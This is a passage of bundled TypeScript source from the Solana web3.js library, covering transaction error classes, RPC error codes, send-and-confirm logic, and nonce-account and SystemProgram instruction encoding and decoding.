'${((a: never) => a)(action)}'`;\n      }\n    }\n    super(message);\n\n    this.signature = signature;\n    this.transactionMessage = transactionMessage;\n    this.transactionLogs = logs ? logs : undefined;\n  }\n\n  get transactionError(): {message: string; logs?: string[]} {\n    return {\n      message: this.transactionMessage,\n      logs: Array.isArray(this.transactionLogs)\n        ? this.transactionLogs\n        : undefined,\n    };\n  }\n\n  /* @deprecated Use `await getLogs()` instead */\n  get logs(): string[] | undefined {\n    const cachedLogs = this.transactionLogs;\n    if (\n      cachedLogs != null &&\n      typeof cachedLogs === 'object' &&\n      'then' in cachedLogs\n    ) {\n      return undefined;\n    }\n    return cachedLogs;\n  }\n\n  async getLogs(connection: Connection): Promise<string[]> {\n    if (!Array.isArray(this.transactionLogs)) {\n      this.transactionLogs = new Promise((resolve, reject) => {\n        connection\n          .getTransaction(this.signature)\n          .then(tx => {\n            if (tx && tx.meta && tx.meta.logMessages) {\n              const logs = tx.meta.logMessages;\n              this.transactionLogs = logs;\n              resolve(logs);\n            } else {\n              reject(new Error('Log messages not found'));\n            }\n          })\n          .catch(reject);\n      });\n    }\n    return await this.transactionLogs;\n  }\n}\n\n// Keep in sync with client/src/rpc_custom_errors.rs\n// Typescript `enums` thwart tree-shaking. See https://bargsten.org/jsts/enums/\nexport const SolanaJSONRPCErrorCode = {\n  JSON_RPC_SERVER_ERROR_BLOCK_CLEANED_UP: -32001,\n  JSON_RPC_SERVER_ERROR_SEND_TRANSACTION_PREFLIGHT_FAILURE: -32002,\n  JSON_RPC_SERVER_ERROR_TRANSACTION_SIGNATURE_VERIFICATION_FAILURE: -32003,\n  JSON_RPC_SERVER_ERROR_BLOCK_NOT_AVAILABLE: -32004,\n  JSON_RPC_SERVER_ERROR_NODE_UNHEALTHY: -32005,\n  JSON_RPC_SERVER_ERROR_TRANSACTION_PRECOMPILE_VERIFICATION_FAILURE: -32006,\n  JSON_RPC_SERVER_ERROR_SLOT_SKIPPED: -32007,\n  JSON_RPC_SERVER_ERROR_NO_SNAPSHOT: -32008,\n  JSON_RPC_SERVER_ERROR_LONG_TERM_STORAGE_SLOT_SKIPPED: -32009,\n  JSON_RPC_SERVER_ERROR_KEY_EXCLUDED_FROM_SECONDARY_INDEX: -32010,\n  JSON_RPC_SERVER_ERROR_TRANSACTION_HISTORY_NOT_AVAILABLE: -32011,\n  JSON_RPC_SCAN_ERROR: -32012,\n  JSON_RPC_SERVER_ERROR_TRANSACTION_SIGNATURE_LEN_MISMATCH: -32013,\n  JSON_RPC_SERVER_ERROR_BLOCK_STATUS_NOT_AVAILABLE_YET: -32014,\n  JSON_RPC_SERVER_ERROR_UNSUPPORTED_TRANSACTION_VERSION: -32015,\n  JSON_RPC_SERVER_ERROR_MIN_CONTEXT_SLOT_NOT_REACHED: -32016,\n} as const;\nexport type SolanaJSONRPCErrorCodeEnum =\n  (typeof SolanaJSONRPCErrorCode)[keyof typeof SolanaJSONRPCErrorCode];\n\nexport class SolanaJSONRPCError extends Error {\n  code: SolanaJSONRPCErrorCodeEnum | unknown;\n  data?: any;\n  constructor(\n    {\n      code,\n      message,\n      data,\n    }: Readonly<{code: unknown; message: string; data?: any}>,\n    customMessage?: string,\n  ) {\n    super(customMessage != null ? `${customMessage}: ${message}` : message);\n    this.code = code;\n    this.data = data;\n    this.name = 'SolanaJSONRPCError';\n  }\n}\n","import {Connection, SignatureResult} from '../connection';\nimport {Transaction} from '../transaction';\nimport type {ConfirmOptions} from '../connection';\nimport type {Signer} from '../keypair';\nimport type {TransactionSignature} from '../transaction';\nimport {SendTransactionError} from '../errors';\n\n/**\n * Sign, send and confirm a transaction.\n *\n * If `commitment` option is not specified, defaults to 'max' commitment.\n *\n * @param {Connection} connection\n * @param {Transaction} transaction\n * @param {Array<Signer>} signers\n * @param {ConfirmOptions} [options]\n * @returns {Promise<TransactionSignature>}\n */\nexport async function sendAndConfirmTransaction(\n  connection: Connection,\n  transaction: Transaction,\n  signers: Array<Signer>,\n  options?: ConfirmOptions &\n    Readonly<{\n      // A signal that, when aborted, cancels any outstanding transaction confirmation operations\n      abortSignal?: AbortSignal;\n    }>,\n): Promise<TransactionSignature> {\n  const sendOptions = options && {\n    skipPreflight: options.skipPreflight,\n    preflightCommitment: options.preflightCommitment || options.commitment,\n    maxRetries: options.maxRetries,\n    minContextSlot: options.minContextSlot,\n  };\n\n  const signature = await connection.sendTransaction(\n    transaction,\n    signers,\n    sendOptions,\n  );\n\n  let status: SignatureResult;\n  if (\n    transaction.recentBlockhash != null &&\n    transaction.lastValidBlockHeight != null\n  ) {\n    status = (\n      await connection.confirmTransaction(\n        {\n          abortSignal: options?.abortSignal,\n          signature: signature,\n          blockhash: transaction.recentBlockhash,\n          lastValidBlockHeight: transaction.lastValidBlockHeight,\n        },\n        options && options.commitment,\n      )\n    ).value;\n  } else if (\n    transaction.minNonceContextSlot != null &&\n    transaction.nonceInfo != null\n  ) {\n    const {nonceInstruction} = transaction.nonceInfo;\n    const nonceAccountPubkey = nonceInstruction.keys[0].pubkey;\n    status = (\n      await connection.confirmTransaction(\n        {\n          abortSignal: options?.abortSignal,\n          minContextSlot: transaction.minNonceContextSlot,\n          nonceAccountPubkey,\n          nonceValue: transaction.nonceInfo.nonce,\n          signature,\n        },\n        options && options.commitment,\n      )\n    ).value;\n  } else {\n    if (options?.abortSignal != null) {\n      console.warn(\n        'sendAndConfirmTransaction(): A transaction with a deprecated confirmation strategy was ' +\n          'supplied along with an `abortSignal`. Only transactions having `lastValidBlockHeight` ' +\n          'or a combination of `nonceInfo` and `minNonceContextSlot` are abortable.',\n      );\n    }\n    status = (\n      await connection.confirmTransaction(\n        signature,\n        options && options.commitment,\n      )\n    ).value;\n  }\n\n  if (status.err) {\n    if (signature != null) {\n      throw new SendTransactionError({\n        action: 'send',\n        signature: signature,\n        transactionMessage: `Status: (${JSON.stringify(status)})`,\n      });\n    }\n    throw new Error(\n      `Transaction ${signature} failed (${JSON.stringify(status)})`,\n    );\n  }\n\n  return signature;\n}\n","// zzz\nexport function sleep(ms: number): Promise<void> {\n  return new Promise(resolve => setTimeout(resolve, ms));\n}\n","import {Buffer} from 'buffer';\nimport * as BufferLayout from '@solana/buffer-layout';\n\nimport * as Layout from './layout';\n\nexport interface IInstructionInputData {\n  readonly instruction: number;\n}\n\n/**\n * @internal\n */\nexport type InstructionType<TInputData extends IInstructionInputData> = {\n  /** The Instruction index (from solana upstream program) */\n  index: number;\n  /** The BufferLayout to use to build data */\n  layout: BufferLayout.Layout<TInputData>;\n};\n\n/**\n * Populate a buffer of instruction data using an InstructionType\n * @internal\n */\nexport function encodeData<TInputData extends IInstructionInputData>(\n  type: InstructionType<TInputData>,\n  fields?: any,\n): Buffer {\n  const allocLength =\n    type.layout.span >= 0 ? type.layout.span : Layout.getAlloc(type, fields);\n  const data = Buffer.alloc(allocLength);\n  const layoutFields = Object.assign({instruction: type.index}, fields);\n  type.layout.encode(layoutFields, data);\n  return data;\n}\n\n/**\n * Decode instruction data buffer using an InstructionType\n * @internal\n */\nexport function decodeData<TInputData extends IInstructionInputData>(\n  type: InstructionType<TInputData>,\n  buffer: Buffer,\n): TInputData {\n  let data: TInputData;\n  try {\n    data = type.layout.decode(buffer);\n  } catch (err) {\n    throw new Error('invalid instruction; ' + err);\n  }\n\n  if (data.instruction !== type.index) {\n    throw new Error(\n      `invalid instruction; instruction index mismatch ${data.instruction} != ${type.index}`,\n    );\n  }\n\n  return data;\n}\n","import * as BufferLayout from '@solana/buffer-layout';\n\n/**\n * https://github.com/solana-labs/solana/blob/90bedd7e067b5b8f3ddbb45da00a4e9cabb22c62/sdk/src/fee_calculator.rs#L7-L11\n *\n * @internal\n */\nexport const FeeCalculatorLayout = BufferLayout.nu64('lamportsPerSignature');\n\n/**\n * Calculator for transaction fees.\n *\n * @deprecated Deprecated since Solana v1.8.0.\n */\nexport interface FeeCalculator {\n  /** Cost in lamports to validate a signature. */\n  lamportsPerSignature: number;\n}\n","import * as BufferLayout from '@solana/buffer-layout';\nimport {Buffer} from 'buffer';\n\nimport * as Layout from './layout';\nimport {PublicKey} from './publickey';\nimport type {FeeCalculator} from './fee-calculator';\nimport {FeeCalculatorLayout} from './fee-calculator';\nimport {toBuffer} from './utils/to-buffer';\n\n/**\n * See https://github.com/solana-labs/solana/blob/0ea2843ec9cdc517572b8e62c959f41b55cf4453/sdk/src/nonce_state.rs#L29-L32\n *\n * @internal\n */\nconst NonceAccountLayout = BufferLayout.struct<\n  Readonly<{\n    authorizedPubkey: Uint8Array;\n    feeCalculator: Readonly<{\n      lamportsPerSignature: number;\n    }>;\n    nonce: Uint8Array;\n    state: number;\n    version: number;\n  }>\n>([\n  BufferLayout.u32('version'),\n  BufferLayout.u32('state'),\n  Layout.publicKey('authorizedPubkey'),\n  Layout.publicKey('nonce'),\n  BufferLayout.struct<Readonly<{lamportsPerSignature: number}>>(\n    [FeeCalculatorLayout],\n    'feeCalculator',\n  ),\n]);\n\nexport const NONCE_ACCOUNT_LENGTH = NonceAccountLayout.span;\n\n/**\n * A durable nonce is a 32 byte value encoded as a base58 string.\n */\nexport type DurableNonce = string;\n\ntype NonceAccountArgs = {\n  authorizedPubkey: PublicKey;\n  nonce: DurableNonce;\n  feeCalculator: FeeCalculator;\n};\n\n/**\n * NonceAccount class\n */\nexport class NonceAccount {\n  authorizedPubkey: PublicKey;\n  nonce: DurableNonce;\n  feeCalculator: FeeCalculator;\n\n  /**\n   * @internal\n   */\n  constructor(args: NonceAccountArgs) {\n    this.authorizedPubkey = args.authorizedPubkey;\n    this.nonce = args.nonce;\n    this.feeCalculator = args.feeCalculator;\n  }\n\n  /**\n   * Deserialize NonceAccount from the account data.\n   *\n   * @param buffer account data\n   * @return NonceAccount\n   */\n  static fromAccountData(\n    buffer: Buffer | Uint8Array | Array<number>,\n  ): NonceAccount {\n    const nonceAccount = NonceAccountLayout.decode(toBuffer(buffer), 0);\n    return new NonceAccount({\n      authorizedPubkey: new PublicKey(nonceAccount.authorizedPubkey),\n      nonce: new PublicKey(nonceAccount.nonce).toString(),\n      feeCalculator: nonceAccount.feeCalculator,\n    });\n  }\n}\n","import {Buffer} from 'buffer';\nimport {blob, Layout} from '@solana/buffer-layout';\nimport {toBigIntLE, toBufferLE} from 'bigint-buffer';\n\ninterface EncodeDecode<T> {\n  decode(buffer: Buffer, offset?: number): T;\n  encode(src: T, buffer: Buffer, offset?: number): number;\n}\n\nconst encodeDecode = <T>(layout: Layout<T>): EncodeDecode<T> => {\n  const decode = layout.decode.bind(layout);\n  const encode = layout.encode.bind(layout);\n  return {decode, encode};\n};\n\nconst bigInt =\n  (length: number) =>\n  (property?: string): Layout<bigint> => {\n    const layout = blob(length, property);\n    const {encode, decode} = encodeDecode(layout);\n\n    const bigIntLayout = layout as Layout<unknown> as Layout<bigint>;\n\n    bigIntLayout.decode = (buffer: Buffer, offset: number) => {\n      const src = decode(buffer, offset);\n      return toBigIntLE(Buffer.from(src));\n    };\n\n    bigIntLayout.encode = (bigInt: bigint, buffer: Buffer, offset: number) => {\n      const src = toBufferLE(bigInt, length);\n      return encode(src, buffer, offset);\n    };\n\n    return bigIntLayout;\n  };\n\nexport const u64 = bigInt(8);\n\nexport const u128 = bigInt(16);\n\nexport const u192 = bigInt(24);\n\nexport const u256 = bigInt(32);\n","import * as BufferLayout from '@solana/buffer-layout';\n\nimport {\n  encodeData,\n  decodeData,\n  InstructionType,\n  IInstructionInputData,\n} from '../instruction';\nimport * as Layout from '../layout';\nimport {NONCE_ACCOUNT_LENGTH} from '../nonce-account';\nimport {PublicKey} from '../publickey';\nimport {SYSVAR_RECENT_BLOCKHASHES_PUBKEY, SYSVAR_RENT_PUBKEY} from '../sysvar';\nimport {Transaction, TransactionInstruction} from '../transaction';\nimport {toBuffer} from '../utils/to-buffer';\nimport {u64} from '../utils/bigint';\n\n/**\n * Create account system transaction params\n */\nexport type CreateAccountParams = {\n  /** The account that will transfer lamports to the created account */\n  fromPubkey: PublicKey;\n  /** Public key of the created account */\n  newAccountPubkey: PublicKey;\n  /** Amount of lamports to transfer to the created account */\n  lamports: number;\n  /** Amount of space in bytes to allocate to the created account */\n  space: number;\n  /** Public key of the program to assign as the owner of the created account */\n  programId: PublicKey;\n};\n\n/**\n * Transfer system transaction params\n */\nexport type TransferParams = {\n  /** Account that will transfer lamports */\n  fromPubkey: PublicKey;\n  /** Account that will receive transferred lamports */\n  toPubkey: PublicKey;\n  /** Amount of lamports to transfer */\n  lamports: number | bigint;\n};\n\n/**\n * Assign system transaction params\n */\nexport type AssignParams = {\n  /** Public key of the account which will be assigned a new owner */\n  accountPubkey: PublicKey;\n  /** Public key of the program to assign as the owner */\n  programId: PublicKey;\n};\n\n/**\n * Create account with seed system transaction params\n */\nexport type CreateAccountWithSeedParams = {\n  /** The account that will transfer lamports to the created account */\n  fromPubkey: PublicKey;\n  /** Public key of the created account. Must be pre-calculated with PublicKey.createWithSeed() */\n  newAccountPubkey: PublicKey;\n  /** Base public key to use to derive the address of the created account. Must be the same as the base key used to create `newAccountPubkey` */\n  basePubkey: PublicKey;\n  /** Seed to use to derive the address of the created account. Must be the same as the seed used to create `newAccountPubkey` */\n  seed: string;\n  /** Amount of lamports to transfer to the created account */\n  lamports: number;\n  /** Amount of space in bytes to allocate to the created account */\n  space: number;\n  /** Public key of the program to assign as the owner of the created account */\n  programId: PublicKey;\n};\n\n/**\n * Create nonce account system transaction params\n */\nexport type CreateNonceAccountParams = {\n  /** The account that will transfer lamports to the created nonce account */\n  fromPubkey: PublicKey;\n  /** Public key of the created nonce account */\n  noncePubkey: PublicKey;\n  /** Public key to set as authority of the created nonce account */\n  authorizedPubkey: PublicKey;\n  /** Amount of lamports to transfer to the created nonce account */\n  lamports: number;\n};\n\n/**\n * Create nonce account with seed system transaction params\n */\nexport type CreateNonceAccountWithSeedParams = {\n  /** The account that will transfer lamports to the created nonce account */\n  fromPubkey: PublicKey;\n  /** Public key of the created nonce account */\n  noncePubkey: PublicKey;\n  /** Public key to set as authority of the created nonce account */\n  authorizedPubkey: PublicKey;\n  /** Amount of lamports to transfer to the created nonce account */\n  lamports: number;\n  /** Base public key to use to derive the address of the nonce account */\n  basePubkey: PublicKey;\n  /** Seed to use to derive the address of the nonce account */\n  seed: string;\n};\n\n/**\n * Initialize nonce account system instruction params\n */\nexport type InitializeNonceParams = {\n  /** Nonce account which will be initialized */\n  noncePubkey: PublicKey;\n  /** Public key to set as authority of the initialized nonce account */\n  authorizedPubkey: PublicKey;\n};\n\n/**\n * Advance nonce account system instruction params\n */\nexport type AdvanceNonceParams = {\n  /** Nonce account */\n  noncePubkey: PublicKey;\n  /** Public key of the nonce authority */\n  authorizedPubkey: PublicKey;\n};\n\n/**\n * Withdraw nonce account system transaction params\n */\nexport type WithdrawNonceParams = {\n  /** Nonce account */\n  noncePubkey: PublicKey;\n  /** Public key of the nonce authority */\n  authorizedPubkey: PublicKey;\n  /** Public key of the account which will receive the withdrawn nonce account balance */\n  toPubkey: PublicKey;\n  /** Amount of lamports to withdraw from the nonce account */\n  lamports: number;\n};\n\n/**\n * Authorize nonce account system transaction params\n */\nexport type AuthorizeNonceParams = {\n  /** Nonce account */\n  noncePubkey: PublicKey;\n  /** Public key of the current nonce authority */\n  authorizedPubkey: PublicKey;\n  /** Public key to set as the new nonce authority */\n  newAuthorizedPubkey: PublicKey;\n};\n\n/**\n * Allocate account system transaction params\n */\nexport type AllocateParams = {\n  /** Account to allocate */\n  accountPubkey: PublicKey;\n  /** Amount of space in bytes to allocate */\n  space: number;\n};\n\n/**\n * Allocate account with seed system transaction params\n */\nexport type AllocateWithSeedParams = {\n  /** Account to allocate */\n  accountPubkey: PublicKey;\n  /** Base public key to use to derive the address of the allocated account */\n  basePubkey: PublicKey;\n  /** Seed to use to derive the address of the allocated account */\n  seed: string;\n  /** Amount of space in bytes to allocate */\n  space: number;\n  /** Public key of the program to assign as the owner of the allocated account */\n  programId: PublicKey;\n};\n\n/**\n * Assign account with seed system transaction params\n */\nexport type AssignWithSeedParams = {\n  /** Public key of the account which will be assigned a new owner */\n  accountPubkey: PublicKey;\n  /** Base public key to use to derive the address of the assigned account */\n  basePubkey: PublicKey;\n  /** Seed to use to derive the address of the assigned account */\n  seed: string;\n  /** Public key of the program to assign as the owner */\n  programId: PublicKey;\n};\n\n/**\n * Transfer with seed system transaction params\n */\nexport type TransferWithSeedParams = {\n  /** Account that will transfer lamports */\n  fromPubkey: PublicKey;\n  /** Base public key to use to derive the funding account address */\n  basePubkey: PublicKey;\n  /** Account that will receive transferred lamports */\n  toPubkey: PublicKey;\n  /** Amount of lamports to transfer */\n  lamports: number | bigint;\n  /** Seed to use to derive the funding account address */\n  seed: string;\n  /** Program id to use to derive the funding account address */\n  programId: PublicKey;\n};\n\n/** Decoded transfer system transaction instruction */\nexport type DecodedTransferInstruction = {\n  /** Account that will transfer lamports */\n  fromPubkey: PublicKey;\n  /** Account that will receive transferred lamports */\n  toPubkey: PublicKey;\n  /** Amount of lamports to transfer */\n  lamports: bigint;\n};\n\n/** Decoded transferWithSeed system transaction instruction */\nexport type DecodedTransferWithSeedInstruction = {\n  /** Account that will transfer lamports */\n  fromPubkey: PublicKey;\n  /** Base public key to use to derive the funding account address */\n  basePubkey: PublicKey;\n  /** Account that will receive transferred lamports */\n  toPubkey: PublicKey;\n  /** Amount of lamports to transfer */\n  lamports: bigint;\n  /** Seed to use to derive the funding account address */\n  seed: string;\n  /** Program id to use to derive the funding account address */\n  programId: PublicKey;\n};\n\n/**\n * System Instruction class\n */\nexport class SystemInstruction {\n  /**\n   * @internal\n   */\n  constructor() {}\n\n  /**\n   * Decode a system instruction and retrieve the instruction type.\n   */\n  static decodeInstructionType(\n    instruction: TransactionInstruction,\n  ): SystemInstructionType {\n    this.checkProgramId(instruction.programId);\n\n    const instructionTypeLayout = BufferLayout.u32('instruction');\n    const typeIndex = instructionTypeLayout.decode(instruction.data);\n\n    let type: SystemInstructionType | undefined;\n    for (const [ixType, layout] of Object.entries(SYSTEM_INSTRUCTION_LAYOUTS)) {\n      if (layout.index == typeIndex) {\n        type = ixType as SystemInstructionType;\n        break;\n      }\n    }\n\n    if (!type) {\n      throw new Error('Instruction type incorrect; not a SystemInstruction');\n    }\n\n    return type;\n  }\n\n  /**\n   * Decode a create account system instruction and retrieve the instruction params.\n   */\n  static decodeCreateAccount(\n    instruction: TransactionInstruction,\n  ): CreateAccountParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 2);\n\n    const {lamports, space, programId} = decodeData(\n      SYSTEM_INSTRUCTION_LAYOUTS.Create,\n      instruction.data,\n    );\n\n    return {\n      fromPubkey: instruction.keys[0].pubkey,\n      newAccountPubkey: instruction.keys[1].pubkey,\n      lamports,\n      space,\n      programId: new PublicKey(programId),\n    };\n  }\n\n  /**\n   * Decode a transfer system instruction and retrieve the instruction params.\n   */\n  static decodeTransfer(\n    instruction: TransactionInstruction,\n  ): DecodedTransferInstruction {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 2);\n\n    const {lamports} = decodeData(\n      SYSTEM_INSTRUCTION_LAYOUTS.Transfer,\n      instruction.data,\n    );\n\n    return {\n      fromPubkey: instruction.keys[0].pubkey,\n      toPubkey: instruction.keys[1].pubkey,\n      lamports,\n    };\n  }\n\n  /**\n   * Decode a transfer with seed system instruction and retrieve the instruction params.\n   */\n  static decodeTransferWithSeed(\n    instruction: TransactionInstruction,\n  ): DecodedTransferWithSeedInstruction {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 3);\n\n    const {lamports, seed, programId} = decodeData(\n      SYSTEM_INSTRUCTION_LAYOUTS.TransferWithSeed,\n      instruction.data,\n    );\n\n    return {\n      fromPubkey: instruction.keys[0].pubkey,\n      basePubkey: instruction.keys[1].pubkey,\n      toPubkey: instruction.keys[2].pubkey,\n      lamports,\n      seed,\n      programId: new PublicKey(programId),\n    };\n  }\n\n  /**\n   * Decode an allocate system instruction and retrieve the instruction params.\n   */\n  static decodeAllocate(instruction: TransactionInstruction): AllocateParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 1);\n\n    const {space} = decodeData(\n      SYSTEM_INSTRUCTION_LAYOUTS.Allocate,\n      instruction.data,\n    );\n\n    return {\n      accountPubkey: instruction.keys[0].pubkey,\n      space,\n    };\n  }\n\n  /**\n   * Decode an allocate with seed system instruction and retrieve the instruction params.\n   */\n  static decodeAllocateWithSeed(\n    instruction: TransactionInstruction,\n  ): AllocateWithSeedParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 1);\n\n    const {base, seed, space, programId} = decodeData(\n      SYSTEM_INSTRUCTION_LAYOUTS.AllocateWithSeed,\n      instruction.data,\n    );\n\n    return {\n      accountPubkey: instruction.keys[0].pubkey,\n      basePubkey: new PublicKey(base),\n      seed,\n      space,\n      programId: new PublicKey(programId),\n    };\n  }\n\n  /**\n   * Decode an assign system instruction and retrieve the instruction params.\n   */\n  static decodeAssign(instruction: TransactionInstruction): AssignParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 1);\n\n    const {programId} = decodeData(\n      SYSTEM_INSTRUCTION_LAYOUTS.Assign,\n      instruction.data,\n    );\n\n    return {\n      accountPubkey: instruction.keys[0].pubkey,\n      programId: new PublicKey(programId),\n    };\n  }\n\n  /**\n   * Decode an assign with seed system instruction and retrieve the instruction params.\n   */\n  static decodeAssignWithSeed(\n    instruction: TransactionInstruction,\n  ): AssignWithSeedParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 1);\n\n    const {base, seed, programId} = decodeData(\n      SYSTEM_INSTRUCTION_LAYOUTS.AssignWithSeed,\n      instruction.data,\n    );\n\n    return {\n      accountPubkey: instruction.keys[0].pubkey,\n      basePubkey: new PublicKey(base),\n      seed,\n      programId: new PublicKey(programId),\n    };\n  }\n\n  /**\n   * Decode a create account with seed system instruction and retrieve the instruction params.\n   */\n  static decodeCreateWithSeed(\n    instruction: TransactionInstruction,\n  ): CreateAccountWithSeedParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 2);\n\n    const {base, seed, lamports, space, programId} = decodeData(\n      SYSTEM_INSTRUCTION_LAYOUTS.CreateWithSeed,\n      instruction.data,\n    );\n\n    return {\n      fromPubkey: instruction.keys[0].pubkey,\n      newAccountPubkey: instruction.keys[1].pubkey,\n      basePubkey: new PublicKey(base),\n      seed,\n      lamports,\n      space,\n      programId: new PublicKey(programId),\n    };\n  }\n\n  /**\n   * Decode a nonce initialize system instruction and retrieve the instruction params.\n   */\n  static decodeNonceInitialize(\n    instruction: TransactionInstruction,\n  ): InitializeNonceParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 3);\n\n    const {authorized} = decodeData(\n      SYSTEM_INSTRUCTION_LAYOUTS.InitializeNonceAccount,\n      instruction.data,\n    );\n\n    return {\n      noncePubkey: instruction.keys[0].pubkey,\n      authorizedPubkey: new PublicKey(authorized),\n    };\n  }\n\n  /**\n   * Decode a nonce advance system instruction and retrieve the instruction params.\n   */\n  static decodeNonceAdvance(\n    instruction: TransactionInstruction,\n  ): AdvanceNonceParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 3);\n\n    decodeData(\n      SYSTEM_INSTRUCTION_LAYOUTS.AdvanceNonceAccount,\n      instruction.data,\n    );\n\n    return {\n      noncePubkey: instruction.keys[0].pubkey,\n      authorizedPubkey: instruction.keys[2].pubkey,\n    };\n  }\n\n  /**\n   * Decode a nonce withdraw system instruction and retrieve the instruction params.\n   */\n  static decodeNonceWithdraw(\n    instruction: TransactionInstruction,\n  ): WithdrawNonceParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 5);\n\n    const {lamports} = decodeData(\n      SYSTEM_INSTRUCTION_LAYOUTS.WithdrawNonceAccount,\n      instruction.data,\n    );\n\n    return {\n      noncePubkey: instruction.keys[0].pubkey,\n      toPubkey: instruction.keys[1].pubkey,\n      authorizedPubkey: instruction.keys[4].pubkey,\n      lamports,\n    };\n  }\n\n  /**\n   * Decode a nonce authorize system instruction and retrieve the instruction params.\n   */\n  static decodeNonceAuthorize(\n    instruction: TransactionInstruction,\n  ): AuthorizeNonceParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeyLength(instruction.keys, 2);\n\n    const {authorized} = decodeData(\n      SYSTEM_INSTRUCTION_LAYOUTS.AuthorizeNonceAccount,\n      instruction.data,\n    );\n\n    return {\n      noncePubkey: instruction.keys[0].pubkey,\n      authorizedPubkey: instruction.keys[1].pubkey,\n      newAuthorizedPubkey: new PublicKey(authorized),\n    };\n  }\n\n  /**\n   * @internal\n   */\n  static checkProgramId(programId: PublicKey) {\n    if (!programId.equals(SystemProgram.programId)) {\n      throw new Error('invalid instruction; programId is not SystemProgram');\n    }\n  }\n\n  /**\n   * @internal\n   */\n  static checkKeyLength(keys: Array<any>, expectedLength: number) {\n    if (keys.length < expectedLength) {\n      throw new Error(\n        `invalid instruction; found ${keys.length} keys, expected at least ${expectedLength}`,\n      );\n    }\n  }\n}\n\n/**\n * An enumeration of valid SystemInstructionType's\n */\nexport type SystemInstructionType =\n  // FIXME\n  // It would be preferable for this type to be `keyof SystemInstructionInputData`\n  // but Typedoc does not transpile `keyof` expressions.\n  // See https://github.com/TypeStrong/typedoc/issues/1894\n  | 'AdvanceNonceAccount'\n  | 'Allocate'\n  | 'AllocateWithSeed'\n  | 'Assign'\n  | 'AssignWithSeed'\n  | 'AuthorizeNonceAccount'\n  | 'Create'\n  | 'CreateWithSeed'\n  | 'InitializeNonceAccount'\n  | 'Transfer'\n  | 'TransferWithSeed'\n  | 'WithdrawNonceAccount'\n  | 'UpgradeNonceAccount';\n\ntype SystemInstructionInputData = {\n  AdvanceNonceAccount: IInstructionInputData;\n  Allocate: IInstructionInputData & {\n    space: number;\n  };\n  AllocateWithSeed: IInstructionInputData & {\n    base: Uint8Array;\n    programId: Uint8Array;\n    seed: string;\n    space: number;\n  };\n  Assign: IInstructionInputData & {\n    programId: Uint8Array;\n  };\n  AssignWithSeed: IInstructionInputData & {\n    base: Uint8Array;\n    seed: string;\n    programId: Uint8Array;\n  };\n  AuthorizeNonceAccount: IInstructionInputData & {\n    authorized: Uint8Array;\n  };\n  Create: IInstructionInputData & {\n    lamports: number;\n    programId: Uint8Array;\n    space: number;\n  };\n  CreateWithSeed: IInstructionInputData & {\n    base: Uint8Array;\n    lamports: number;\n    programId: Uint8Array;\n    seed: string;\n    space: number;\n  };\n  InitializeNonceAccount: IInstructionInputData & {\n    authorized: Uint8Array;\n  };\n  Transfer: IInstructionInputData & {\n    lamports: bigint;\n  };\n  TransferWithSeed: IInstructionInputData & {\n    lamports: bigint;\n    programId: Uint8Array;\n    seed: string;\n  };\n  WithdrawNonceAccount: IInstructionInputData & {\n    lamports: number;\n  };\n  UpgradeNonceAccount: IInstructionInputData;\n};\n\n/**\n * An enumeration of valid system InstructionType's\n * @internal\n */\nexport const SYSTEM_INSTRUCTION_LAYOUTS = Object.freeze<{\n  [Instruction in SystemInstructionType]: InstructionType<\n    SystemInstructionInputData[Instruction]\n  >;\n}>({\n  Create: {\n    index: 0,\n    layout: BufferLayout.struct<SystemInstructionInputData['Create']>([\n      BufferLayout.u32('instruction'),\n      BufferLayout.ns64('lamports'),\n      BufferLayout.ns64('space'),\n      Layout.publicKey('programId'),\n    ]),\n  },\n  Assign: {\n    index: 1,\n    layout: BufferLayout.struct<SystemInstructionInputData['Assign']>([\n      BufferLayout.u32('instruction'),\n      Layout.publicKey('programId'),\n    ]),\n  },\n  Transfer: {\n    index: 2,\n    layout: BufferLayout.struct<SystemInstructionInputData['Transfer']>([\n      BufferLayout.u32('instruction'),\n      u64('lamports'),\n    ]),\n  },\n  CreateWithSeed: {\n    index: 3,\n    layout: BufferLayout.struct<SystemInstructionInputData['CreateWithSeed']>([\n      BufferLayout.u32('instruction'),\n      Layout.publicKey('base'),\n      Layout.rustString('seed'),\n      BufferLayout.ns64('lamports'),\n      BufferLayout.ns64('space'),\n      Layout.publicKey('programId'),\n    ]),\n  },\n  AdvanceNonceAccount: {\n    index: 4,\n    layout: BufferLayout.struct<\n      SystemInstructionInputData['AdvanceNonceAccount']\n    >([BufferLayout.u32('instruction')]),\n  },\n  WithdrawNonceAccount: {\n    index: 5,\n    layout: BufferLayout.struct<\n      SystemInstructionInputData['WithdrawNonceAccount']\n    >([BufferLayout.u32('instruction'), BufferLayout.ns64('lamports')]),\n  },\n  InitializeNonceAccount: {\n    index: 6,\n    layout: BufferLayout.struct<\n      SystemInstructionInputData['InitializeNonceAccount']\n    >([BufferLayout.u32('instruction'), Layout.publicKey('authorized')]),\n  },\n  AuthorizeNonceAccount: {\n    index: 7,\n    layout: BufferLayout.struct<\n      SystemInstructionInputData['AuthorizeNonceAccount']\n    >([BufferLayout.u32('instruction'), Layout.publicKey('authorized')]),\n  },\n  Allocate: {\n    index: 8,\n    layout: BufferLayout.struct<SystemInstructionInputData['Allocate']>([\n      BufferLayout.u32('instruction'),\n      BufferLayout.ns64('space'),\n    ]),\n  },\n  AllocateWithSeed: {\n    index: 9,\n    layout: BufferLayout.struct<SystemInstructionInputData['AllocateWithSeed']>(\n      [\n        BufferLayout.u32('instruction'),\n        Layout.publicKey('base'),\n        Layout.rustString('seed'),\n        BufferLayout.ns64('space'),\n        Layout.publicKey('programId'),\n      ],\n    ),\n  },\n  AssignWithSeed: {\n    index: 10,\n    layout: BufferLayout.struct<SystemInstructionInputData['AssignWithSeed']>([\n      BufferLayout.u32('instruction'),\n     